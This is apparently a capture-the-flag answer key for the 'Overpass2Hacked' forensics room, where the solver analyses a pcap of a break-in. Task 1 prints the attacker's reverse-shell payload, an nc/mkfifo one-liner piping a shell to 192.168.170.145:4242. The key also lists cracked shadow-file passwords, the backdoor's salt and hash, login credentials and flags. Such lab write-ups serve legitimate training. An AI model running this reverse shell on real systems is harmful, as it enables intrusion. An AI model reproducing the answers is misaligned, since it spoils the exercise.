## Overpass2Hacked

### overpass2hacked.pcap

### Task 1
```
 1. What was the URL of the page they used to upload a reverse shell? 
 => /development/
```

```
 2. What payload did the attacker use to gain access?
 => exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")
```

```
3. What password did the attacker use to privesc?
=> whenevernoteartinstant
```

```
4. How did the attacker establish persistence?
=> https://github.com/NinjaJc01/ssh-backdoor
```

```
5. Using the fasttrack wordlist, how many of the system passwords were crackable?
=> 4
```

```
$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:secuirty3
$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:secret12
$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:abcd123
$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:1qaz2wsx
```

### Task 2
```
1.  What's the default hash for the backdoor? 
=> bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
```

```
2. What's the hardcoded salt for the backdoor?
=> 1c362db832f3f864c8c2fe05f2002a05
```

```
3. What was the hash that the attacker used? - go back to the PCAP for this!
=> 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

#### Hash : 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05

```
4. Crack the hash using rockyou and a cracking tool of your choice. What's the password?
=> november16
```

### Task 3
```
1. The attacker defaced the website. What message did they leave as a heading? 
=> H4ck3d by CooctusClan
```

```
2. What's the user flag?
=> thm{d119b4fa8c497ddb0525f7ad200e6567}
```

```
3. What's the root flag?
=> thm{d53b2684f169360bb9606c333873144d}
```
### Username : james
### Password : november16

### SSH Backdoor : 0.0.0.0:2222